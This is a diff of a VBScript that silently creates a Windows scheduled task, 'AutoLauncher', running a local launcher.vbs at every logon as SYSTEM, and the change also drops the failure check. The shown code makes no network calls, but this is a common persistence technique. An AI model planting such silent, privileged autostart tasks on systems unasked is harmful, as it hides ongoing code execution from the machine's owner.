@@ -31,24 +31,15 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 currentDir = objFSO.GetAbsolutePathName(".")
 launcherPath = currentDir & "\launcher.vbs"
 
-' Create scheduled task silently
-Set objExec = objShell.Exec("cmd.exe /c schtasks /create /tn ""AutoLauncher"" /tr """ & launcherPath & """ /sc onlogon /delay 00:30 /f /ru SYSTEM")
+' Create scheduled task using schtasks directly
+Set objExec = objShell.Exec("schtasks /create /tn ""AutoLauncher"" /tr """ & launcherPath & """ /sc onlogon /delay 00:30 /f /ru SYSTEM /it")
 
 ' Wait for task creation to complete
 Do While objExec.Status = 0
     WScript.Sleep 100
 Loop
 
-' Check if task was created successfully
-If objExec.ExitCode <> 0 Then
-    ' Failed silently - no message box
-    Set objExec = Nothing
-    Set objShell = Nothing
-    Set objFSO = Nothing
-    WScript.Quit
-End If
-
-' Success - clean up and exit silently
+' Clean up and exit silently
 Set objExec = Nothing
 Set objShell = Nothing
 Set objFSO = Nothing
